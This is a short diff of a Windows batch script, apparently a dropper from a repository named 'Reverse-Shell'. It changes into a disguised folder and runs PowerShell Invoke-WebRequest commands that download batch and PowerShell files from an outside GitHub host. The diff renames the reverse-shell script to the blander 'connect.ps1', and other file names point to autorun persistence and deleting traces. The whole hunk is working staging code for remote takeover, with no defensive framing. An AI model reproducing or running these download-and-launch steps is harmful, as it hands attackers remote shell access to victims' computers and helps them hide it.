@@ -4,7 +4,7 @@ cd C:\
 cd $WINDOWS.~GG
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/launch.bat -Outfile launch.bat"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/ReverseShell.ps1 -Outfile ReverseShell.ps1"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/connect.ps1 -Outfile connect.ps1"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/autorun.bat -Outfile autorun.bat"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/DELRUNFILES.bat -Outfile DELRUNFILES.bat"
 cd %appdata%
